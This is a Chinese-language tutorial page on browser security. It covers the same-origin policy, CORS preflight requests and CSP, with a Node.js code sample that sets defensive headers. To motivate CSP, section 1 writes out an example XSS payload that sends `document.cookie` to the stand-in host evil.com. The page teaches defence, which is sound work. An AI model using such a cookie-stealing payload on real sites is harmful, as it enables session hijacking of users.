---
title: 概念 15 · 同源策略、CORS 预检与 CSP
---

# 概念 15｜同源策略、CORS 预检与 CSP（浏览器三大安全保镖）

> **一句话人话定义**：
> - **同源策略（Same-Origin Policy）**：浏览器的隔离墙——规定 `evil.com` 的网页脚本**不准偷读** `bank.com` 接口返回的数据；
> - **CORS（跨域资源共享）**：服务器贴在响应头上的“放行条”（`Access-Control-Allow-Origin`），告诉浏览器：“这个外域网站是我自己人，准许它读数据！”；
> - **CSP（内容安全策略）**：服务器发给浏览器的“白名单圣旨”（`Content-Security-Policy`），命令浏览器：“哪怕页面被人注入了恶意 `<script>`，只要不在白名单里，一律禁止执行！”

## 1. 它们被什么痛点逼出来的？

你在浏览器里刚登录了网银 `https://bank.com`，浏览器自动存下了网银的登录 Cookie。
下一秒你不小心点开了一个钓鱼网站 `https://evil.com`。如果浏览器没有任何限制：
1. `evil.com` 里的 JS 直接发一个 `fetch('https://bank.com/api/balance')`，就能把你的银行余额和流水全偷走！（为了防这个，逼出了 **同源策略 + CORS**）。
2. 如果黑客在你的网站评论区输入了一段 `<script>fetch('https://evil.com?cookie='+document.cookie)</script>`（这就是 **XSS 跨站脚本攻击**），别的用户的浏览器一打开评论区，就会自动执行这段恶意代码！（为了防这个，逼出了 **HttpOnly Cookie + CSP 内容安全策略**）。

## 2. 慢放图解：CORS 跨域与 Preflight（OPTIONS 预检请求）的真相

很多前端新手最大的误解是：“跨域报错是请求没发出去，或者被服务器拦截了”。
**真相恰恰相反**：对于简单请求，浏览器**把请求实打实地发出去了，服务器也实打实地返回了 200 和数据**，是**浏览器收到响应后，检查发现响应头里没有合法的 `Access-Control-Allow-Origin` 放行条，于是把数据扣留销毁，并向你的控制台抛出红色 CORS 报错**！

而如果是一个**可能修改服务器状态的危险跨域请求**（比如带了 `Content-Type: application/json`、自定义 Header `Authorization`、或者方法是 `PUT / DELETE`），万一服务器根本不支持跨域，直接把请求发过去岂不是已经把数据库改坏了？
于是浏览器会在发真请求之前，先自动发一个 **`OPTIONS` 预检请求（Preflight）** 去探路：

```text
浏览器 (app.com)                                            服务器 (api.com)
   │                                                            │
   ├─ 1. 先自动发 OPTIONS 预检请求（不带业务数据，只问准不准）：│
   │     Origin: https://app.com                                │
   │     Access-Control-Request-Method: POST                    │
   │     Access-Control-Request-Headers: content-type, token    │
   ├───────────────────────────────────────────────────────────►│
   │                                                            │
   │  2. 服务器贴出“放行条”响应：                              │
   │     Access-Control-Allow-Origin: https://app.com           │
   │     Access-Control-Allow-Methods: POST, GET, OPTIONS       │
   │     Access-Control-Allow-Headers: content-type, token      │
   │     Access-Control-Max-Age: 86400 (24小时内不用再重复预检！)│
   │◄───────────────────────────────────────────────────────────┤
   │                                                            │
   ├─ 3. 预检通过！浏览器这才发出真正的 POST 业务请求 ─────────►│
```

## 3. 20 行极简代码原型：Node.js 服务端手写标准 CORS + CSP 防御头

```js
import http from 'node:http'

http.createServer((req, res) => {
  // 1. 配置 CORS 跨域放行条
  res.setHeader('Access-Control-Allow-Origin', 'https://app.example.com')
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
  res.setHeader('Access-Control-Max-Age', '86400') // 缓存预检结果 24 小时，省掉多余 RTT！

  // 2. 如果是浏览器的 OPTIONS 预检探路请求，直接返回 204 空响应即可
  if (req.method === 'OPTIONS') { res.writeHead(204); return res.end() }

  // 3. 配置 CSP 内容安全策略：只准加载同源脚本，彻底废掉内联 XSS 脚本！
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'")
  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ ok: true }))
})
```

## 4. 前后端架构双视角落地

| 攻击与场景 | 前端架构防御职责 | 后端与网关架构防御职责 |
| :--- | :--- | :--- |
| **CORS 跨域治理** | 开发环境用 Vite `server.proxy` 代理转发绕开浏览器同源限制；生产环境优先通过同一主域下的 Nginx 反向代理（`/api`）统一同源，减少跨域 `OPTIONS` 预检损耗 | API 网关统一处理 `OPTIONS` 预检并配置 `Access-Control-Max-Age` 缓存，严禁在需要携带凭证（`credentials: 'include'`）时配置通配符 `*` |
| **XSS 与 CSRF 防御** | 默认使用 Vue `{{ }}` 自动转义，严禁将用户输入直接塞进 `v-html`（若必须渲染富文本，先用 `DOMPurify` 清洗） | 登录态 Cookie 强制开启 `HttpOnly`（防 XSS 偷读）、`Secure`（仅限 HTTPS）、`SameSite=Lax/Strict`（防跨站伪造请求 CSRF），配合 CSP 响应头 |

---

> 🔙 **返回主线教程**：[第 13 讲：前端性能治理、安全攻防与监控 SDK](../01-教程/第13讲-前端性能治理安全攻防与监控SDK.md) ｜ [第 14 讲：一次请求出门](../01-教程/第14讲-一次请求出门DNS-TCP-TLS与HTTP演进.md)  
> 🧪 **亲手验证本概念**：[实验 10：手写前端错误捕获与性能监控探针](../03-实验/实验10-手写前端错误与性能监控探针.md)  
> 👉 **下一篇概念（进入 C 辑网络与分布式）**：[概念 16｜TCP 三次握手、字节流与队头阻塞](./16-TCP三次握手与队头阻塞.md)
